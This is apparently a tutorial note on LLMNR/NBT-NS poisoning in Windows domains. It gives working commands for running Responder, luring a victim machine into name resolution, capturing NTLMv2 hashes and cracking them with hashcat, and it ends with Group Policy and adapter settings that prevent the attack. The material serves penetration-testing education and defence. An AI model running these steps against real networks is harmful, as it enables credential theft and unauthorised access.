[Article](https://predatech.co.uk/llmnr-nbt-ns-poisoning-windows-domain-environments/)

* **Port 137** is used by the **NetBIOS Name Service (NBT-NS)**
* **Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are two backup name resolution protocols used by windows machines when DNS resolution fails. These services are enabled by default on modern windows systems

---

### How Name Resolution Happens

1. **Check localhost** - Is the name of computer itself?
2. **Hosts File** = Is it in ``C:\Windows\System32\drivers\etc\hosts``?
3. **DNS Server** - Ask the configured DNS server
4. **LLMNR Query** - Broadcast an LLMNR request to all local hosts
5. **NBT-NS Query** - Broadcast a NetBIOS request to all local hosts.

---

### How LLMNR and NBT-NS Poisoning Works

Attackers can abuse LLMNR/NBT-NS because when these requests are broadcasted, **any machine** can reply with an answer - even if it is a rogue (attacker-controlled) machine

If an attacker responds **quickly enough**, the victimcomputer believes the attacker's IP is the correct destination. This allows the attacker to:

* capture **authentication hashes**
* Perform **Man-in-the-Middle(MITM)** attack

---

### Step by Step : Performing LLMNR/NBT-NS Poisoning with responder

**Step 1. Install and Run Responder**

Install Responder:

* pip install orderreddict # for Python 2.x dependency

```bash
apt install responder
```

check responder version:

```bash
responder --help
```

```bash
responder --version
```

Run responder:

```bash
responder -I eth0 -dvw
```

* ``-I eth0`` -> Network interface
* ``-d`` -> Poisoning mode
* ``-v`` -> verbose mode
* ``-w`` -> Enable WinProxy detection

Alternatively, clone it manually

```bash
git clone https://github.com/SpiderLabs/Responder.git
```

```bash
python2.7 Responder.py --help
```

```bash
python2.7 Responder.py --version
```

```bash
python2.7 Responder.py -I eth0 -rdvw
```

**Step 2. Trigger a Name Resolution Attempt**

On the target windows machine:

```cmd
ping s1.local -t
```

Or access non existent resource

```cmd
\\s1.local
```

* Your attacker machine's IP will respond (example ``\\192.168.29.218``)


**Step 3. Capture the NTLMv2 Hash**

When the victim tries to authenticate, Responder captures an **NTLMv2 Hash**:

```cmd
[HTTP] NTLMv2 Hash :    ash::POKEMON:1122334455667788:dwednuhjhd8w88yqwd0qwu:...
```


**Step 4. Crack the NTLMv2 Hash**

Identify the hash format:

```bash
hashid <hash>
```

Result ``NetNTLMv2 [Hashcat Mode: 5600]``

```bash
hashcat -m 5600 ash-hash.txt /opt/rockyou.txt
```

---

### How to prevent this attack

#### Disable LLMNR (via Group Policy)

1. Open **Group Policy Management** on the Domain Controller
2. create a new GPO (name it "LLMNR Disables")
3. Edit the GPO:
   * Navigate : ``Computer Configuration -> Policies -> Administrative Templates -> Network -> DNS Client``
   * Double click : Turn off multicast name resolution
   * Set to **enabled** 
4. Apply and close


#### Disable NBT-NS (NetBIOS over TCP/IP)

1. Goto ``Control Panel -> Network and Sharing Center -> Change Adapter Settings``
2. Right Click active network interface -> **Properties**
3. Double-Click ``Internet Protocol Version 4 (TCP/IPv4).
4. Click **Advanced** -> **WINS** tab
5. Select **Disable NetBIOS over TCP/IP** -> **OK**